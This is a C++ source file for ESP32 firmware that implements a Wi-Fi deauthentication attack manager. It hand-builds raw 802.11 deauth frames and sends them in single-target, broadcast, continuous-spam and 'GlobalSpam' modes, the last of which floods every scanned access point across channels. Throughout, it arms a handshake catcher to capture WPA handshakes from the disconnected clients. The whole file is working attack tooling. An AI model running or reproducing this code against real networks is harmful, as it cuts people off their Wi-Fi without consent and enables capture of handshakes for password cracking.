#include "DeauthManager.hpp"
#include "../storage/AccessPointManager.hpp"
#include "HandshakeCatcher.hpp"
#include <esp_wifi.h>
#include <cstring>

using namespace std;

DeauthManager& DeauthManager::GetInstance()
{
    static DeauthManager instance;
    return instance;
}

void DeauthManager::SendDeauthPacket(const MacAddress& dest, const MacAddress& src, const MacAddress& bssid, uint16_t reasonCode)
{
    static uint16_t sequenceNumber = 0;

    uint8_t frame[26] = {
        0xC0, 0x00, 
        0x3A, 0x01, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00,
        0x00, 0x00 
    };

    memcpy(&frame[4], dest.addr, 6);
    memcpy(&frame[10], src.addr, 6);
    memcpy(&frame[16], bssid.addr, 6);

    uint16_t seqControl = (sequenceNumber << 4);
    frame[22] = seqControl & 0xFF;
    frame[23] = (seqControl >> 8) & 0xFF;

    sequenceNumber++;
    if (sequenceNumber > 0xFFF) 
    {
        sequenceNumber = 0;
    }

    frame[24] = reasonCode & 0xFF;
    frame[25] = (reasonCode >> 8) & 0xFF;

    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
    packetsSent_.fetch_add(1);
}

void DeauthManager::StartAttack(AttackMode mode, const MacAddress& apMac, uint8_t channel, const MacAddress& clientMac)
{
    if (isAttacking_.load()) StopAttack();

    packetsSent_.store(0);
    currentMode_ = mode;
    targetAp_ = apMac;
    targetClient_ = clientMac;
    targetChannel_ = channel;
    
    if (mode == AttackMode::SingleTarget || mode == AttackMode::SpamTarget)
    {
        HandshakeCatcher::GetInstance().SetTarget(apMac, clientMac);
    }
    else if (mode == AttackMode::BroadcastAP || mode == AttackMode::SpamAP)
    {
        MacAddress broadcastMac = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        HandshakeCatcher::GetInstance().SetTarget(apMac, broadcastMac);
    }
    else
    {
        HandshakeCatcher::GetInstance().ClearTarget();
    }

    isAttacking_.store(true);

    if (mode == AttackMode::SingleTarget || mode == AttackMode::BroadcastAP)
    {
        esp_wifi_set_channel(targetChannel_, WIFI_SECOND_CHAN_NONE);
        
        if (mode == AttackMode::SingleTarget)
        {
            SendDeauthPacket(targetClient_, targetAp_, targetAp_);
            SendDeauthPacket(targetAp_, targetClient_, targetAp_);
        }
        else
        {
            SendDeauthPacket({0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, targetAp_, targetAp_);
        }
            
        isAttacking_.store(false);
        currentMode_ = AttackMode::None;
        HandshakeCatcher::GetInstance().ClearTarget();
    }
    else
    {
        xTaskCreate(AttackTask, "AttackTask", 3072, this, 2, &attackTaskHandle_);
    }
}

void DeauthManager::StopAttack()
{
    if (!isAttacking_.load()) return;
    
    isAttacking_.store(false);
    
    if (attackTaskHandle_ != nullptr)
    {
        vTaskDelay(pdMS_TO_TICKS(50));
        if (attackTaskHandle_ != nullptr) 
        {
             vTaskDelete(attackTaskHandle_);
             attackTaskHandle_ = nullptr;
        }
    }
    currentMode_ = AttackMode::None;
    HandshakeCatcher::GetInstance().ClearTarget();
}

void DeauthManager::AttackTask(void* arg)
{
    DeauthManager* manager = static_cast<DeauthManager*>(arg);
    MacAddress broadcastMac = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    if (manager->currentMode_ != AttackMode::GlobalSpam)
        esp_wifi_set_channel(manager->targetChannel_, WIFI_SECOND_CHAN_NONE);

    while (manager->isAttacking_.load())
    {
        if (manager->currentMode_ == AttackMode::GlobalSpam)
        {
            auto aps = AccessPointManager::GetInstance().GetAccessPoints();
            if (aps.empty()) 
            {
                vTaskDelay(pdMS_TO_TICKS(100));
                continue; 
            }

            for (const auto& ap : aps)
            {
                if (!manager->isAttacking_.load()) break; 
                
                manager->targetChannel_ = ap.channel; 
                esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
                manager->SendDeauthPacket(broadcastMac, ap.bssid, ap.bssid);
                
                vTaskDelay(pdMS_TO_TICKS(20)); 
            }
        }
        else if (manager->currentMode_ == AttackMode::SpamTarget)
        {
            manager->SendDeauthPacket(manager->targetClient_, manager->targetAp_, manager->targetAp_);
            manager->SendDeauthPacket(manager->targetAp_, manager->targetClient_, manager->targetAp_);
            vTaskDelay(pdMS_TO_TICKS(10)); 
        }
        else if (manager->currentMode_ == AttackMode::SpamAP)
        {
            manager->SendDeauthPacket(broadcastMac, manager->targetAp_, manager->targetAp_);
            vTaskDelay(pdMS_TO_TICKS(10)); 
        }
    } 

    manager->attackTaskHandle_ = nullptr;
    vTaskDelete(nullptr);
}